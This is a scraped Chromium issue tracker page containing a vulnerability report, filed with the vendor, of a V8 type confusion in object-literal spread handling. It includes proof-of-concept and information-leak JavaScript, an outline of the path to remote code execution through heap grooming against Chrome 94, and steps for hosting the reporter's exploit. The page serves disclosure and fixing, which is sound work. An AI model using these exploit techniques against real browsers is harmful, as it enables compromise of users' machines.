 function _go(url, newWindow) {
 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;
 }
 function $(id) { return document.getElementById(id); }
 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;
 };

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }

          Issue tracker keyboard shortcuts

              <span></span>Issue list<span class="help-title"><!---->Issue list<!----></span>
              
                
                  
                    k<kbd><!---->k<!----></kbd>
                     / <span class="key-separator"> / </span>
                  
                    j<kbd><!---->j<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->k<!----></kbd>

                    <kbd><!---->j<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                up/down in the list<span class="key-tip"><!---->up/down in the list<!----></span>
              
                
                  
                    o<kbd><!---->o<!----></kbd>
                     / <span class="key-separator"> / </span>

                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->o<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->Enter<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                open the current issue<span class="key-tip"><!---->open the current issue<!----></span>
              
                
                  
                    Shift-O<kbd><!---->Shift-O<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>

    <mr-cue centered="" cueprefname="search_for_numbers" hidden=""></mr-cue>
      
          
      
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      
      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

          <td>
            <mr-field-values></mr-field-values>

        Description #1 by cthomp@chromium.org (Oct 14, 2021)

    <!---->
        </select>
      </div>
      This bug is split off from <span class="line"><!---->This bug is split off from <!----></span>Issue 1260109<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1260109" title="Security: [Umbrella Bug] V8 CreateLiteral type confusion when processing ..spread leads to RCE + RenderFrameHostImpl logic error leading browser UAF"><!---->Issue 1260109<!----></a> <span class="line"><!----> <!----></span>to track the V8 type confusion bug portion of that report. Details below are copied from that bug. <span class="line"><!---->to track the V8 type confusion bug portion of that report. Details below are copied from that bug. <!----></span><br><br>-------------------------<b class="line"><!---->-------------------------<!----></b><br><br>= RCE: Type confusion when creating an object literal with the `...spread operation`<span class="line"><!---->= RCE: Type confusion when creating an object literal with the `...spread operation`<!----></span><br>-------------------------<b class="line"><!---->-------------------------<!----></b>-------------------------------------------------------<span class="line"><!---->-------------------------------------------------------<!----></span><br><br>I. VULNERABILITY DETAILS<span class="line"><!---->I. VULNERABILITY DETAILS<!----></span><br><br>When creating an object literal with the `...spread` operator the bytecode generator has two branches, I'll be focusing on the first branch [0]. If the first "argument" when creating the object literal is a `...spread` operator the bytecode generator will output a `CloneObject` [1]. `CloneObject` will call `CloneObjectIC_Slow` if the feedback vector is not set. `CloneObjectIC_Slow` will only set the properties in the `target` (`literal` in this case) object if they are in the `source` object. This is important for later.<span class="line"><!---->When creating an object literal with the `...spread` operator the bytecode generator has two branches, I'll be focusing on the first branch [0]. If the first "argument" when creating the object literal is a `...spread` operator the bytecode generator will output a `CloneObject` [1]. `CloneObject` will call `CloneObjectIC_Slow` if the feedback vector is not set. `CloneObjectIC_Slow` will only set the properties in the `target` (`literal` in this case) object if they are in the `source` object. This is important for later.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var object = { ...source };<span class="line"><!---->var object = { ...source };<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Next within the bytecode generator, if any indexes are in being declared in the object literal after the `...spread` operator then `Runtime_SetKeyedProperty` will be called on the `literal` object [2]. `Runtime_SetKeyedProperty` has two interesting characteristics: it will walk up prototype chains and it will trigger the `setter` callback. The combination of these two characteristics means we can define a setter on `Object.prototype` and assign a global variable to `this` within the getter to get a reference to the `literal` object. The example code below showcases how this works logically, the `duped` variable and `result` are the same object.<span class="line"><!---->Next within the bytecode generator, if any indexes are in being declared in the object literal after the `...spread` operator then `Runtime_SetKeyedProperty` will be called on the `literal` object [2]. `Runtime_SetKeyedProperty` has two interesting characteristics: it will walk up prototype chains and it will trigger the `setter` callback. The combination of these two characteristics means we can define a setter on `Object.prototype` and assign a global variable to `this` within the getter to get a reference to the `literal` object. The example code below showcases how this works logically, the `duped` variable and `result` are the same object.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Object.prototype.__defineSetter__(0, function() {<span class="line"><!---->Object.prototype.__defineSetter__(0, function() {<!----></span><br>   duped = this; <span class="line"><!---->   duped = this; <!----></span><br>});<span class="line"><!---->});<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var result = { ...source, 0 : 5 };<span class="line"><!---->var result = { ...source, 0 : 5 };<!----></span><br>%DebugPrint(result);<span class="line"><!---->%DebugPrint(result);<!----></span><br>%DebugPrint(duped);<span class="line"><!---->%DebugPrint(duped);<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Next within the bytecode generator, more spreads are processed. This uses `Runtime::kInlineCopyDataProperties` with `literal` as the target and the "argument" as the source [3]. Here we make the target == source by passing the `literal` object that we grabbed in the setter with a spread operator. This will trigger a DCHECK in Builtins::CopyDataProperties which the intrinsic `Runtime::kInlineCopyDataProperties` gets lowered to [4].<span class="line"><!---->Next within the bytecode generator, more spreads are processed. This uses `Runtime::kInlineCopyDataProperties` with `literal` as the target and the "argument" as the source [3]. Here we make the target == source by passing the `literal` object that we grabbed in the setter with a spread operator. This will trigger a DCHECK in Builtins::CopyDataProperties which the intrinsic `Runtime::kInlineCopyDataProperties` gets lowered to [4].<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Object.prototype.__defineSetter__(0, function() {<span class="line"><!---->Object.prototype.__defineSetter__(0, function() {<!----></span><br>   duped = this; <span class="line"><!---->   duped = this; <!----></span><br>});<span class="line"><!---->});<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var result = { ...source, 0 : 5, ...duped };<span class="line"><!---->var result = { ...source, 0 : 5, ...duped };<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>II. EXPLOITATION DETAILS<span class="line"><!---->II. EXPLOITATION DETAILS<!----></span><br><br>Next if the map of the `target` object is deprecated, then the builtin SetOrCopyDataProperties will bailout to `Runtime_CopyDataProperties` which will eventually call `JSReceiver::FastAssign`. Within this function there is a call to `JSObject::CreateDataProperty` [6] that is not protected by a stable map check [5]. When source == destination, `JSReceiver::CreateDataProperty` can cause the object to convert from FastProperties to DictionaryProperties if an accessor is being redefined to a normal value AND the splitmap's transition array is full (if it contains 1536 transitions). Full Infoleak POC:<span class="line"><!---->Next if the map of the `target` object is deprecated, then the builtin SetOrCopyDataProperties will bailout to `Runtime_CopyDataProperties` which will eventually call `JSReceiver::FastAssign`. Within this function there is a call to `JSObject::CreateDataProperty` [6] that is not protected by a stable map check [5]. When source == destination, `JSReceiver::CreateDataProperty` can cause the object to convert from FastProperties to DictionaryProperties if an accessor is being redefined to a normal value AND the splitmap's transition array is full (if it contains 1536 transitions). Full Infoleak POC:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>var a = { n : 5 };<span class="line"><!---->var a = { n : 5 };<!----></span><br><br>let return_double = function() {<span class="line"><!---->let return_double = function() {<!----></span><br>    return 5.5;<span class="line"><!---->    return 5.5;<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>Object.prototype.__defineSetter__(0, function() { <span class="line"><!---->Object.prototype.__defineSetter__(0, function() { <!----></span><br>    duped = this;<span class="line"><!---->    duped = this;<!----></span><br>    duped.__defineGetter__('getter', return_double);<span class="line"><!---->    duped.__defineGetter__('getter', return_double);<!----></span><br>    duped.o = 1.1;<span class="line"><!---->    duped.o = 1.1;<!----></span><br>    duped.p = 1.1;<span class="line"><!---->    duped.p = 1.1;<!----></span><br>    duped.q = 1.1;<span class="line"><!---->    duped.q = 1.1;<!----></span><br>    duped.r = 1.1;<span class="line"><!---->    duped.r = 1.1;<!----></span><br>    duped.s = 1.1;<span class="line"><!---->    duped.s = 1.1;<!----></span><br>    duped.t = 1.1;<span class="line"><!---->    duped.t = 1.1;<!----></span><br><br>    /*<span class="line"><!---->    /*<!----></span><br>        1. Create `b` an object that shares a map<span class="line"><!---->        1. Create `b` an object that shares a map<!----></span><br>           map with `duped`.<span class="line"><!---->           map with `duped`.<!----></span><br>    */<span class="line"><!---->    */<!----></span><br>    b = {};<span class="line"><!---->    b = {};<!----></span><br>    b.n = 5; <span class="line"><!---->    b.n = 5; <!----></span><br>    b.__defineGetter__('getter', return_double);<span class="line"><!---->    b.__defineGetter__('getter', return_double);<!----></span><br>    b.o = 1.1;<span class="line"><!---->    b.o = 1.1;<!----></span><br>    b.p = 1.1;<span class="line"><!---->    b.p = 1.1;<!----></span><br>    b.q = 1.1;<span class="line"><!---->    b.q = 1.1;<!----></span><br>    b.r = 1.1;<span class="line"><!---->    b.r = 1.1;<!----></span><br>    b.s = 1.1;<span class="line"><!---->    b.s = 1.1;<!----></span><br>    b.t = 1.1;<span class="line"><!---->    b.t = 1.1;<!----></span><br><br>    // deprecate `duped`'s map<span class="line"><!---->    // deprecate `duped`'s map<!----></span><br>    b.n = 1.1;<span class="line"><!---->    b.n = 1.1;<!----></span><br><br><br>    // Fill up the SplitMap's transition array<span class="line"><!---->    // Fill up the SplitMap's transition array<!----></span><br>    for (var i = 0; i < 1024 + 1024; i++) {<span class="line"><!---->    for (var i = 0; i &lt; 1024 + 1024; i++) {<!----></span><br>        var tmp = {};<span class="line"><!---->        var tmp = {};<!----></span><br>        tmp.n = 5;<span class="line"><!---->        tmp.n = 5;<!----></span><br>        tmp['tt' + i.toString()] = 5;<span class="line"><!---->        tmp['tt' + i.toString()] = 5;<!----></span><br>    }<span class="line"><!---->    }<!----></span><br><br>});<span class="line"><!---->});<!----></span><br><br>var obj = { ...a , 0 : 5 , ...duped};<span class="line"><!---->var obj = { ...a , 0 : 5 , ...duped};<!----></span><br><br>print(obj.o);<span class="line"><!---->print(obj.o);<!----></span><br>print(obj.p);<span class="line"><!---->print(obj.p);<!----></span><br>print(obj.q);<span class="line"><!---->print(obj.q);<!----></span><br>print(obj.r);<span class="line"><!---->print(obj.r);<!----></span><br>print(obj.s);<span class="line"><!---->print(obj.s);<!----></span><br>print(obj.t);<span class="line"><!---->print(obj.t);<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Turning this into an RCE was tough because unboxed doubles were removed and the number of constraints involved when src == dst, but I found a way by abusing the in-object properties. The basic idea is that when the map transitions from FastProperties to DictionaryProperties in-object properties are cleared, but the DescriptorArray will still have the cached descriptor of in_object() for the first four properties of the object [7]. Using determinism in scavenge garbage collection routines I was able to trigger a garbage collection after the in-object properties were cleared, resulting in the object being moved to old space and compacted with other objects. With a clever heap-groom I was able to place a BigInt object immediately after the object in OldSpace <span class="line"><!---->Turning this into an RCE was tough because unboxed doubles were removed and the number of constraints involved when src == dst, but I found a way by abusing the in-object properties. The basic idea is that when the map transitions from FastProperties to DictionaryProperties in-object properties are cleared, but the DescriptorArray will still have the cached descriptor of in_object() for the first four properties of the object [7]. Using determinism in scavenge garbage collection routines I was able to trigger a garbage collection after the in-object properties were cleared, resulting in the object being moved to old space and compacted with other objects. With a clever heap-groom I was able to place a BigInt object immediately after the object in OldSpace <!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Before GC:<span class="line"><!---->Before GC:<!----></span><br>[Map][Properties][elements][inobject #0][inobject #1][inobject #2][inobject #3]<span class="line"><!---->[Map][Properties][elements][inobject #0][inobject #1][inobject #2][inobject #3]<!----></span><br><br>After GC:<span class="line"><!---->After GC:<!----></span><br>[Map][Properties][elements][Bigint Map][Bigint Length][digits][digits]<span class="line"><!---->[Map][Properties][elements][Bigint Map][Bigint Length][digits][digits]<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Giving me the ability to place any value in the now OOB read to the [inobject] slot after the GC, allowing me to create a Fake Object.<span class="line"><!---->Giving me the ability to place any value in the now OOB read to the [inobject] slot after the GC, allowing me to create a Fake Object.<!----></span><br><br>NOTE: The GC timing is deterministic for hosts with >2GB of memory. Hosts with less than 2GB of memory will require a different heap-spray. The exploit in its current state doesn't use the infoleak above and just uses fixed offsets so it will only work on 94.0.4606.81 on ubuntu.<span class="line"><!---->NOTE: The GC timing is deterministic for hosts with &gt;2GB of memory. Hosts with less than 2GB of memory will require a different heap-spray. The exploit in its current state doesn't use the infoleak above and just uses fixed offsets so it will only work on 94.0.4606.81 on ubuntu.<!----></span><br><br>III. REPRODUCTION DETAILS<span class="line"><!---->III. REPRODUCTION DETAILS<!----></span><br><br>POC<span class="line"><!---->POC<!----></span><br>1. Build D8<span class="line"><!---->1. Build D8<!----></span><br>2. ./out/x64.release/d8 poc.js<span class="line"><!---->2. ./out/x64.release/d8 poc.js<!----></span><br>3. ./out/x64.debug/d8 poc.js<span class="line"><!---->3. ./out/x64.debug/d8 poc.js<!----></span><br><br>EXPLOIT<span class="line"><!---->EXPLOIT<!----></span><br>1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<span class="line"><!---->1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<!----></span><br>2. Install Google Chrome version 94.0.4606.81<span class="line"><!---->2. Install Google Chrome version 94.0.4606.81<!----></span><br>3. Navigate to <span class="line"><!---->3. Navigate to <!----></span>https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html<a class="undefined" target="_blank" href="https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html"><!---->https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html<!----></a><br>3a. NOTE: My server is required because I take advantage of site-isolation to spawn multiple renderer processes in different "sites".<span class="line"><!---->3a. NOTE: My server is required because I take advantage of site-isolation to spawn multiple renderer processes in different "sites".<!----></span><br>4. View the source in the attachment 28_fakeobj_remote_fresh.tar.gz<span class="line"><!---->4. View the source in the attachment 28_fakeobj_remote_fresh.tar.gz<!----></span><br><br>[0] <span class="line"><!---->[0]         Details from the reporter I forgot to copy over for the RCE exploit:<span class="line"><!---->Details from the reporter I forgot to copy over for the RCE exploit:<!----></span><br><br>-------<span class="line"><!---->-------<!----></span><br><br>To host the renderer exploit locally you need to change a few things:<span class="line"><!---->To host the renderer exploit locally you need to change a few things:<!----></span><br><br>SERVER<span class="line"><!---->SERVER<!----></span><br>Host three https sites:<span class="line"><!---->Host three https sites:<!----></span><br>site1.com<a class="undefined" target="_blank" href="https://site1.com"><!---->site1.com<!----></a><br>site2.com<a class="undefined" target="_blank" href="https://site2.com"><!---->site2.com<!----></a><br>site3.com<a class="undefined" target="_blank" href="https://site3.com"><!---->site3.com<!----></a><br><br>And then host the contents of 28_fakeobj_remote_fresh.tar.gz on each of the sites. Then replace all instances of chromepwn1.pwn, chromepwn2.pw, and chromepwn3.pw in the source with<span class="line"><!---->And then host the contents of 28_fakeobj_remote_fresh.tar.gz on each of the sites. Then replace all instances of chromepwn1.pwn, chromepwn2.pw, and chromepwn3.pw in the source with<!----></span> <span class="line"><!----> <!----></span>site1.com<a class="undefined" target="_blank" href="https://site1.com"><!---->site1.com<!----></a>,<span class="line"><!---->,<!----></span> <span class="line"><!----> <!----></span>site2.com<a class="undefined" target="_blank" href="https://site2.com"><!---->site2.com<!----></a>, and<span class="line"><!---->, and<!----></span> <span class="line"><!----> <!----></span>site3.com<a class="undefined" target="_blank" href="https://site3.com"><!---->site3.com<!----></a> in the javascript/html files within 28_fakeobj_remote_fresh.<span class="line"><!----> in the javascript/html files within 28_fakeobj_remote_fresh.<!----></span><br><br>CLIENT<span class="line"><!---->CLIENT<!----></span><br>1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<span class="line"><!---->1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<!----></span><br>2. Install Google Chrome version 94.0.4606.81<span class="line"><!---->2. Install Google Chrome version 94.0.4606.81<!----></span><br>3. Navigate to <span class="line"><!---->3. Testing initially, the iframe crashed immediately for me on Linux 94.0.4606.81. Retrying in an Incognito window the iframe didn't crash immediately but it did crash after I clicked "Calc" in the iframe. <span class="line"><!---->I was able to run this by swapping in `site1.localhost`, `site2.localhost`,  and `site3.localhost` (with entries pointing to 127.0.0.1 in /etc/hosts) and Caddy's built-in support for setting up a local root CA. Testing initially, the iframe crashed immediately for me on Linux 94.0.4606.81. Retrying in an Incognito window the iframe didn't crash immediately but it did crash after I clicked "Calc" in the iframe. <!----></span><br><br>I noticed there is some javascript commented out in the parent-6a...html file -- is this intentional? Should I add it back in?<span class="line"><!---->I noticed there is some javascript commented out in the parent-6a...html file -- is this intentional? Should I add it back in?<!----></span><br><br>I'll spin up an 18.04.6 VM instance next to test there -- this was on Debian.<span class="line"><!---->I'll spin up an 18.04.6 VM instance next to test there -- this was on Debian.<!----></span><mr-comment-content></mr-comment-content>

        Thanks for the report!<span class="line"><!---->Thanks for the report!<!----></span><br>The second patch (<span class="line"><!---->The second patch (<!----></span>https://crrev.com/c/3224666<a class="undefined" target="_blank" href="https://crrev.com/c/3224666"><!---->https://crrev.com/c/3224666<!----></a>)<span class="line"><!---->)<!----></span> has an issue with keyed properties, as used in your repro.<span class="line"><!----> has an issue with keyed properties, as used in your repro.<!----></span><br>I am not sure how quickly we would have caught this problem without your report, so thanks a lot!<span class="line"><!---->I am not sure how quickly we would have caught this problem without your report, so thanks a lot!<!----></span><br>As for the root cause: It should never happen that `target` is equal to `from`. The real root cause is that it was possible to leak the pointer to the object during creation by executing user code, which shouldn't happen (the setter in your poc shouldn't be executed).<span class="line"><!---->As for the root cause: It should never happen that `target` is equal to `from`. The real root cause is that it was possible to leak the pointer to the object during creation by executing user code, which shouldn't happen (the setter in your poc shouldn't be executed).<!----></span><mr-comment-content></mr-comment-content>

